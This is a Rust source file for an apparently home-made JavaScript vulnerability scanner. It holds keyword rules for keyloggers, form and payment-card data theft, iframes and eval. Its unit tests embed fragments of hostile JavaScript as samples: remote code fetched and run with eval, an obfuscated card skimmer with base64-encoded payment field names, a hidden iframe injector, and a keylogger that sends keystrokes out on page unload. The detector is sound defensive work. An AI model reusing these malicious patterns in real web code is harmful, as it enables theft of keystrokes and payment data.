use crate::VulnerabilityType::{Alert, Warning};
use base64::{Engine as _, engine::general_purpose};
use clap::Parser;
use colored::Colorize;
use regex::Regex;
use std::fs;

#[derive(Parser)]
#[command(name = "JSVS")]
#[command(version = "0.1.0")]
#[command(about = "JavaScript Vulnerability Scanner", long_about = None)]
struct Cli {
    #[arg(short, long)]
    filepath: String,
}

struct VulnerabilityRule {
    keywords: Vec<String>,
    description: String,
    vulnerability_type: VulnerabilityType,
}

struct DetectedVulnerability {
    keyword: String,
    keyword_index: usize,
    description: String,
    vulnerability_type: VulnerabilityType,
}

#[derive(Debug, PartialEq, Eq)]
enum VulnerabilityType {
    Warning,
    Alert,
}

fn main() {
    let cli = Cli::parse();
    let filepath = cli.filepath;

    if fs::metadata(&filepath).is_err() {
        eprintln!("Error: filepath {} does not exist", &filepath);
        return;
    }

    let file_content = fs::read_to_string(filepath).expect("Cannot read file");
    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(file_content, false);
    print_summary_of_the_analysis(&vulnerabilities);
}

fn find_vulnerabilities_in_the_javascript_code(
    code: String,
    is_base64_decoded: bool,
) -> Vec<DetectedVulnerability> {
    let mut vulnerabilities: Vec<DetectedVulnerability> = Vec::new();

    vulnerabilities.extend(find_vulnerabilities_by_rules(&code, is_base64_decoded));
    vulnerabilities.extend(find_suspicious_hex_obfuscation(&code));
    vulnerabilities.extend(find_vulnerabilities_in_base64_text(&code));
    vulnerabilities.extend(find_possible_remote_code_execution(&vulnerabilities));
    vulnerabilities
}

fn print_summary_of_the_analysis(vulnerabilities: &Vec<DetectedVulnerability>) {
    println!();
    println!(" ■ JavaScript Vulnerability Detection Summary");
    println!();

    if !vulnerabilities.is_empty() {
        print_detected_vulnerabilities(&vulnerabilities);
    } else {
        println!("{}", " ✓ Looks like this code is safe!".bright_green());
    }

    println!();
    println!(
        "{} {} {}",
        " ✕ Detected",
        vulnerabilities.len().to_string().red(),
        "vulnerabilities"
    );
}

fn print_detected_vulnerabilities(detected_vulnerabilities: &Vec<DetectedVulnerability>) {
    for v in detected_vulnerabilities {
        println!(
            " • {}\t index: {}\t keyword: {} {}",
            if v.vulnerability_type == Alert {
                "Alert".red()
            } else {
                "Warning".yellow()
            },
            v.keyword_index.to_string().bright_blue(),
            v.keyword.to_string().underline(),
            v.description.cyan()
        );
    }
}

fn find_vulnerabilities_by_rules(
    file_content: &String,
    is_base64_decoded: bool,
) -> Vec<DetectedVulnerability> {
    let mut detected_vulnerabilities: Vec<DetectedVulnerability> = Vec::new();
    for rule in get_vulnerability_rules() {
        for keyword in rule.keywords {
            if let Some(index) = &file_content.to_lowercase().find(&keyword) {
                let description: String = if is_base64_decoded {
                    format!("{} {}", &rule.description.clone(), "(BASE64 decoded)")
                } else {
                    rule.description.to_string()
                };

                let vulnerability_type = if rule.vulnerability_type == Alert {
                    Alert
                } else if is_base64_decoded {
                    Alert
                } else {
                    Warning
                };

                detected_vulnerabilities.push(DetectedVulnerability {
                    keyword,
                    keyword_index: *index,
                    description,
                    vulnerability_type,
                });
            }
        }
    }
    detected_vulnerabilities
}

fn find_vulnerabilities_in_base64_text(content: &String) -> Vec<DetectedVulnerability> {
    let base64_encoded_text = encode_base64_text(content);
    let mut detected_vulnerabilities: Vec<DetectedVulnerability> = Vec::new();
    if !base64_encoded_text.as_str().is_empty() {
        detected_vulnerabilities.push(DetectedVulnerability {
            keyword: "base64".to_string(),
            keyword_index: 0,
            description: String::from(
                "Found base64 encoded text what may suggest hiding some information",
            ),
            vulnerability_type: Warning,
        });

        let decoded_bytes = general_purpose::STANDARD_NO_PAD
            .decode(base64_encoded_text)
            .expect("Failed to decode base64 string");

        let base64_decoded_text = String::from_utf8(decoded_bytes).expect("Invalid UTF-8");
        detected_vulnerabilities.extend(find_vulnerabilities_in_the_javascript_code(
            base64_decoded_text,
            true,
        ));
    }
    detected_vulnerabilities
}

fn encode_base64_text(content: &String) -> String {
    let base64_pattern = r"(?i)\b[A-Za-z0-9+/=]{50,}\b";
    let re = Regex::new(base64_pattern).unwrap();
    let mut base64_encoded_text = String::new();
    for value in re.find_iter(&content) {
        base64_encoded_text.push_str(&value.as_str());
    }
    base64_encoded_text
}

fn count_hex_values(content: &String) -> usize {
    let mut hex_counter: usize = 0;
    let hex_pattern = r"(?i)\b(?:0x[a-f0-9]+|#[a-f0-9]{6}|\b[a-f0-9]{8}\b)\b";
    let re = Regex::new(hex_pattern).unwrap();
    for _ in re.find_iter(&content) {
        hex_counter += 1;
    }
    hex_counter
}

fn find_suspicious_hex_obfuscation(content: &String) -> Vec<DetectedVulnerability> {
    let hex_counter = count_hex_values(&content);
    let mut detected_vulnerabilities: Vec<DetectedVulnerability> = Vec::new();

    if hex_counter > 0 {
        detected_vulnerabilities.push(DetectedVulnerability {
            keyword: "0x".to_string(),
            keyword_index: 0,
            description: if hex_counter < 10 {
                String::from(format!("{} hexadecimal values", hex_counter))
            } else {
                String::from(format!(
                    "{} hexadecimal values suggests heavy obfuscation what can hide malware",
                    hex_counter
                ))
            },
            vulnerability_type: if hex_counter < 10 { Warning } else { Alert },
        });
    }

    detected_vulnerabilities
}

fn find_possible_remote_code_execution(
    vulnerabilities: &Vec<DetectedVulnerability>,
) -> Vec<DetectedVulnerability> {
    let mut detected_vulnerabilities: Vec<DetectedVulnerability> = Vec::new();
    let mut response_text_index: usize = 0;
    let mut eval_index: usize = 0;
    let mut exec_script_index: usize = 0;
    for v in vulnerabilities {
        if v.keyword == "xmlhttpreq.responsetext" {
            response_text_index = v.keyword_index
        } else if v.keyword == "eval" {
            eval_index = v.keyword_index
        } else if v.keyword == "execscript" {
            exec_script_index = v.keyword_index
        }
    }

    if (response_text_index > 0 && eval_index > 0) || (exec_script_index > 0 && eval_index > 0) {
        let diff_eval: usize = if response_text_index <= eval_index {
            eval_index - response_text_index
        } else {
            999
        };

        let diff_exec: usize = if response_text_index <= exec_script_index {
            exec_script_index - response_text_index
        } else {
            999
        };

        if diff_eval < 100 || diff_exec < 100 {
            detected_vulnerabilities.push(DetectedVulnerability {
                keyword: String::from("eval/execscript(xmlhttpreq.responsetext)"),
                keyword_index: eval_index,
                description: String::from(
                    "Possible execution of the malicious code from the remote server",
                ),
                vulnerability_type: Alert,
            })
        }
    }
    detected_vulnerabilities
}

fn get_vulnerability_rules() -> [VulnerabilityRule; 17] {
    [
        VulnerabilityRule {
            keywords: vec![
                String::from("eval"),
                String::from("execscript"),
                String::from("document.write"),
                String::from("document.createelement(\"script\")"),
            ],
            description: String::from("Possible XSS"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("xmlhttprequest"),
                String::from("xhr.open"),
                String::from("xmlhttpreq.responsetext"),
                String::from("fetch"),
                String::from("https://"),
            ],
            description: String::from("Possible insecure API call"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![String::from("atob"), String::from("btoa")],
            description: String::from("Suspicious Base64 encoding or decoding"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("addeventlistener(\"keydown\""),
                String::from("addeventlistener(\"keyup\""),
                String::from("addeventlistener(\"keypress\""),
            ],
            description: String::from("Possible keylogger"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("addeventlistener"),
                String::from("addeventlistener(\"submit\""),
                String::from("addeventlistener(\"load\""),
                String::from("addeventlistener(\"unload\""),
                String::from("addeventlistener(\"beforeunload\""),
            ],
            description: String::from("Triggering actions on event"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("document.queryselectorall"),
                String::from("formdata()"),
                String::from("innerText"),
            ],
            description: String::from("Possible user data exfiltration"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![String::from("preventdefault()")],
            description: String::from("Changing app behavior by preventing default actions"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("localstorage"),
                String::from("sessionstorage"),
                String::from("getitem"),
            ],
            description: String::from("Reading local storage or session storage capabilities"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![String::from("setitem"), String::from("removeitem")],
            description: String::from("local storage or session storage manipulation"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![String::from("createlement"), String::from("appendchild")],
            description: String::from("DOM manipulation"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![String::from("document.createelement(\"iframe\")")],
            description: String::from("IFrame injection with possible clickjacking"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![String::from("iframe")],
            description: String::from("IFrame found, what can enable hidden tracking"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![String::from(".js")],
            description: String::from("External script usage"),
            vulnerability_type: Warning,
        },
        VulnerabilityRule {
            keywords: vec![String::from("http://")],
            description: String::from("Insecure API Call without SSL"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("window.location.assign"),
                String::from("window.location.reload"),
            ],
            description: String::from("Possible session hijacking"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("customerData"),
                String::from("input-firstname"),
                String::from("input-lastname"),
                String::from("email"),
                String::from("telephone"),
                String::from("phone"),
                String::from("address"),
                String::from("city"),
                String::from("postcode"),
                String::from("zip"),
                String::from("zone"),
                String::from("country"),
            ],
            description: String::from("Possible user data exfiltration with specified fields"),
            vulnerability_type: Alert,
        },
        VulnerabilityRule {
            keywords: vec![
                String::from("input-payment"),
                String::from("input-payment-firstname"),
                String::from("input-payment-lastname"),
                String::from("input-payment-email"),
                String::from("input-payment-telephone"),
                String::from("input-payment-city"),
                String::from("input-payment-postcode"),
                String::from("input-cc-owner"),
                String::from("input-cc-number"),
                String::from("input-cc-expire-date"),
                String::from("input-cc-cvv2"),
                String::from("holder"),
                String::from("cvv"),
                String::from("ccv"),
                String::from("cc_expire_date_year"),
            ],
            description: String::from("Possible user payment data exfiltration and money stealing"),
            vulnerability_type: Alert,
        },
    ]
}

#[test]
fn test_should_find_xss_insecure_api_call_and_remote_code_execution() {
    let malicious_code = "
    var xhr = new XMLHttpRequest();
    xhr.open(\"GET\", url, false);
    xhr.setRequestHeader(\"Content-type\",
        \"application/x-www-form-urlencoded\");
    xhr.onreadystatechange = function() {
        var XMLHttpReq = xhr;
        if (XMLHttpReq.readyState == 4) {
            if (XMLHttpReq.status == 200) {
                var text = XMLHttpReq.responseText;
                if (window.execScript) {
                    window.execScript(text);
                } else {
                    window.eval(text);
                }
            }
        }
    };
    xhr.send(null);"
        .to_string();

    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(malicious_code, false);

    assert_eq!(vulnerabilities.len(), 6);
    assert_eq!(vulnerabilities[0].description, "Possible XSS");
    assert_eq!(vulnerabilities[0].vulnerability_type, Alert);
    assert_eq!(vulnerabilities[2].description, "Possible insecure API call");
    assert_eq!(vulnerabilities[2].vulnerability_type, Warning);
    assert_eq!(
        vulnerabilities[5].description,
        "Possible execution of the malicious code from the remote server"
    );
    assert_eq!(vulnerabilities[5].vulnerability_type, Alert);
}

#[test]
fn test_should_find_heavy_obfuscation_storage_manipulation_and_data_exfiltration() {
    let malicious_code = "
    function _0xfd2f(_0x4cbd43,_0x26cb82){var _0x472006=_0x4720();return
    _0xfd2f=function(_0xfd2ff5,_0x5a7bba){_0xfd2ff5=_0xfd2ff5-0xd3;var
    _0x54210b=_0x472006[_0xfd2ff5];return
    _0x54210b;},_0xfd2f(_0x4cbd43,_0x26cb82);}var
    _0x4d5ab1=_0xfd2f;(function(_0x49367b,_0x1e07e3){var
    _0x31a4f3=_0xfd2f,_0x5f409f=_0x49367b();while(!![]){try{var
    _0x5d4f33=parseInt(_0x31a4f3(0x108))/0x1*(parseInt(_0x31a4f3(0xf6))/0x2)+-pa
    rseInt(_0x31a4f3(0x118))/0x3*(-parseInt(_0x31a4f3(0xe1))/0x4)+-parseInt(_0x3
    1a4f3(0xef))/0x5*(parseInt(_0x31a4f3(0x105))/0x6)+-parseInt(_0x31a4f3(0x10f)
    )/0x7*(-parseInt(_0x31a4f3(0xfc))/0x8)+-parseInt(_0x31a4f3(0x101))/0x9+parse
    Int(_0x31a4f3(0x10d))/0xa+-parseInt(_0x31a4f3(0xe8))/0xb*(parseInt(_0x31a4f3
    (0x11d))/0xc);if(_0x5d4f33===_0x1e07e3)break;else
    _0x5f409f['push'](_0x5f409f['shift']());}catch(_0x14d45e){_0x5f409f['push'](
    _0x5f409f['shift']());}}}(_0x4720,0xe52d9));function _0x4720(){var
    _0x3ddb09=['vnskp_type','34472647ZfYNqD','yxkxl','toString','innerText','rkr
    hv','phone','wwtlq','45XOedQO','lqbjn','length','default_billing','selectedO
    ptions','parse','region','34ctScIO','mepgq','forEach','Holder','vnskp','scnh
    m','16ZjpFvE','object','bmmuw','blfoi','country','3986424sIJGeN','value','ci
    ty','JSON','570264RcISWA','qwyjy','replace','101221cMBWHB','slice','firstnam
    e','liluj','country_id','13699150SOIvNk','awcsb','4994892xjGFUw','getElement
    sByTagName','Domain','IMG','fromCharCode','addresses','yqgnj','wsmlv','undef
    ined','12246bODdzt','setInterval','wyhyj','select','ycsnm','12gmYQLy','creat
    eElement','stringify','state','textarea','input','querySelector','append','i
    ndexOf','lytgk','zip','lastname','push','localStorage','zytth','vnskp_param'
    ,'POST','vqmub','sfofx','hasAttribute','random','getItem','setItem','trim','
    "
    .to_string();

    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(malicious_code, false);
    assert_eq!(vulnerabilities.len(), 9);
    assert_eq!(
        vulnerabilities[0].description,
        "Reading local storage or session storage capabilities"
    );
    assert_eq!(vulnerabilities[0].vulnerability_type, Warning);
    assert_eq!(
        vulnerabilities[2].description,
        "local storage or session storage manipulation"
    );
    assert_eq!(vulnerabilities[2].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[3].description,
        "Possible user data exfiltration with specified fields"
    );
    assert_eq!(vulnerabilities[3].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[7].description,
        "Possible user payment data exfiltration and money stealing"
    );
    assert_eq!(vulnerabilities[7].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[8].description,
        "26 hexadecimal values suggests heavy obfuscation what can hide malware"
    );
    assert_eq!(vulnerabilities[8].vulnerability_type, Alert);
}

#[test]
fn test_should_find_data_exfiltration_and_hidden_tracking_in_the_base64_encoded_text() {
    let malicious_code = "
    _0x3afa83=0x0;_0x3afa83<_0x53193b[_0x47fb3d(0xf1)];_0x3afa83++){_0x4bd8d1+='
    %'+('00'+_0x53193b[_0x3afa83]['charCodeAt'](0x0)[_0x47fb3d(0xea)](0x10))[_0x
    47fb3d(0x109)](-0x2);}return
    decodeURIComponent(_0x4bd8d1);},xfkwf[_0x4d5ab1(0xf0)]=document,xfkwf['sfofx
    ']='W1siaWQiLCAiaW5wdXQtcGF5bWVudC1maXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwg
    WyJpZCIsICJpbnB1dC1wYXltZW50LWxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsiaWQi
    LCAiaW5wdXQtZmlyc3RuYW1lIiwgMCwgImYiLCAiSG9sZGVyIl0sIFsiaWQiLCAiaW5wdXQtbGFz
    dG5hbWUiLCAwLCAibCIsICJIb2xkZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibiIsICJO
    dW1iZXIiXSwgWyJmaWVsZCIsICJpZnJhbWUiLCAwLCAibSIsICJEYXRlIl0sIFsiZmllbGQiLCAi
    aWZyYW1lIiwgMCwgInkiLCAiRGF0ZSJdLCBbImZpZWxkIiwgImlmcmFtZSIsIDAsICJjIiwgIkNW
    ViJdLCBbImlkIiwgImlucHV0LWNjLW93bmVyIiwgMCwgImgiLCAiSG9sZGVyIl0sIFsiaWQiLCAi
    aW5wdXQtY2MtbnVtYmVyIiwgMCwgIm4iLCAiTnVtYmVyIl0sIFsiaWQiLCAiaW5wdXQtY2MtZXhw
    aXJlLWRhdGUiLCAwLCAibSIsICJEYXRlIl0sIFsibmFtZSIsICJjY19leHBpcmVfZGF0ZV95ZWFy
    IiwgMCwgInkiLCAiRGF0ZSJdLCBbImlkIiwgImlucHV0LWNjLWN2djIiLCAwLCAiYyIsICJDVlYi
    XSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWN1c3RvbS1maWVsZDQiLCAwLCAic24iLCAic3NuIl0s
    IFsiaWQiLCAiaW5wdXQtcGF5bWVudC1lbWFpbCIsIDAsICJlbCIsICJlbWFpbCJdLCBbImlkIiwg
    ImlucHV0LWVtYWlsIiwgMCwgImVsIiwgImVtYWlsIl0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC10
    ZWxlcGhvbmUiLCAwLCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC10ZWxlcGhvbmUiLCAw
    LCAicGUiLCAicGhvbmUiXSwgWyJpZCIsICJpbnB1dC1wYXltZW50LWNpdHkiLCAwLCAiY3kiLCAi
    Y2l0eSJdLCBbImlkIiwgImlucHV0LXBheW1lbnQtY291bnRyeSIsIDMsICJjdCIsICJjb3VudHJ5
    Il0sIFsiaWQiLCAiaW5wdXQtcGF5bWVudC1wb3N0Y29kZSIsIDAsICJ6cCIsICJ6aXAiXSwgWyJp
    ZCIsICJpbnB1dC1wYXltZW50LXpvbmUiLCAzLCAic3QiLCAic3RhdGUiXSwgWyJpZCIsIFsiaW5w
    dXQtcGF5bWVudC1hZGRyZXNzLTEiLCAiaW5wdXQtcGF5bWVudC1hZGRyZXNzLTIiXSwgMCwgImFz
    IiwgImFkZHIiXV0=',xfkwf[_0x4d5ab1(0x10b)]=_0x4d5ab1(0xe6),xfkwf[_0x4d5ab1(0x
    fb)]=window['JSON'][_0x4d5ab1(0xf4)](xfkwf[_0x4d5ab1(0x116)](xfkwf[_0x4d5ab1
    (0xd9)])),xfkwf[_0x4d5ab1(0x10e)]={},xfkwf[_0x4d5ab1(0xec)]=[],xfkwf[_0x4d5a
    "
    .to_string();

    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(malicious_code, false);
    assert_eq!(vulnerabilities.len(), 28);
    assert_eq!(
        vulnerabilities[0].description,
        "15 hexadecimal values suggests heavy obfuscation what can hide malware"
    );
    assert_eq!(vulnerabilities[0].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[1].description,
        "Found base64 encoded text what may suggest hiding some information"
    );
    assert_eq!(vulnerabilities[1].vulnerability_type, Warning);
    assert_eq!(
        vulnerabilities[2].description,
        "IFrame found, what can enable hidden tracking (BASE64 decoded)"
    );
    assert_eq!(vulnerabilities[2].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[3].description,
        "Possible user data exfiltration with specified fields (BASE64 decoded)"
    );
    assert_eq!(vulnerabilities[3].vulnerability_type, Alert);
}

#[test]
fn test_should_find_xss_possible_clickajacking_and_external_script_usage() {
    let malicious_code = "
    t=document.createElement(\"script\");return
    t.type=\"text\\/javascript\",t.charset=\"utf-8\",t.src=e,t},l=n(76141).public_path
    ,f=l+\"frame.7a3ddac5.js\",w=l+\"vendor.e163e343.js\",h=l+\"frame-modern.78abb9d0
    .js\",v=l+\"vendor-modern.dde03d24.js\",g=\"MySite\",b=/bot|googlebot|crawler|spi
    der|robot|crawling|facebookexternalhit/i,y=function(){return
    window[g]&&window[g].booted},S=function(){var
    e,t=!!(e=navigator.userAgent.match(/Chrom(?:e|ium)\\/([0-9\\.]+)/))&&e[1];retu
    rn!!t&&t.split(\".\").map((function(e){return parseInt(e)}))},A=function(){var
    e=document.querySelector('meta[name=\"referrer\"]'),t=e?'<meta name=\"referrer
    content=\"'+e.content+'\">':\"\",n=document.createElement(\"iframe\");n.id=\"mysite
    -frame\",n.setAttribute(\"style\",\"position: absolute !important; opacity: 0
    !important; width: 1px !important; height: 1px !important; top: 0
    !important; left: 0 !important; border: none !important; display: block
    !important; z-index: -1 !important; pointer-events:
    "
    .to_string();

    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(malicious_code, false);

    assert_eq!(vulnerabilities.len(), 6);
    assert_eq!(vulnerabilities[0].description, "Possible XSS");
    assert_eq!(vulnerabilities[0].vulnerability_type, Alert);
    assert_eq!(
        vulnerabilities[1].description,
        "IFrame injection with possible clickjacking"
    );
    assert_eq!(vulnerabilities[1].vulnerability_type, Alert);
    assert_eq!(vulnerabilities[3].description, "External script usage");
    assert_eq!(vulnerabilities[3].vulnerability_type, Warning);
    assert_eq!(
        vulnerabilities[4].description,
        "Possible user data exfiltration with specified fields"
    );
    assert_eq!(vulnerabilities[4].vulnerability_type, Alert);
}

#[test]
fn test_should_find_keylogger_triggering_actions_data_exfiltration_and_changing_app_behavior() {
    let malicious_code = "
    window.addEventListener(\"keydown\", e => {
        // If it's not just a letter (e.g. a modifier key), make it easier to spot e.g.
        \"[Tab]\"
        if (e.key.length > 1) {
            keys += `[${e.key}]`;
        } else {
            keys += e.key;
        }
    });
    window.addEventListener(\"beforeunload\", function(e) {
        if (keys.length === 0) {
            return;
        }
        e.preventDefault();
        sendData({
            keys,
            url: window.location.href
        }, externURLKeys);
    });

    function collectFormData() {
        const formData = {
            url: window.location.href
        }; // Record URL
        const inputs = document.querySelectorAll(\"input, select, textarea\");
    "
    .to_string();

    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(malicious_code, false);

    assert_eq!(vulnerabilities.len(), 6);
    assert_eq!(vulnerabilities[0].description, "Possible keylogger");
    assert_eq!(vulnerabilities[0].vulnerability_type, Alert);
    assert_eq!(vulnerabilities[1].description, "Triggering actions on event");
    assert_eq!(vulnerabilities[1].vulnerability_type, Alert);
    assert_eq!(vulnerabilities[3].description, "Possible user data exfiltration");
    assert_eq!(vulnerabilities[3].vulnerability_type, Alert);
    assert_eq!(vulnerabilities[5].description, "Changing app behavior by preventing default actions");
    assert_eq!(vulnerabilities[5].vulnerability_type, Alert);
}

#[test]
fn test_should_not_find_any_vulnerabilities_in_the_safe_code() {
    let safe_code = "console.log(\"Hello from the safe code!\");".to_string();
    let vulnerabilities = find_vulnerabilities_in_the_javascript_code(safe_code, false);
    assert_eq!(vulnerabilities.len(), 0);
}
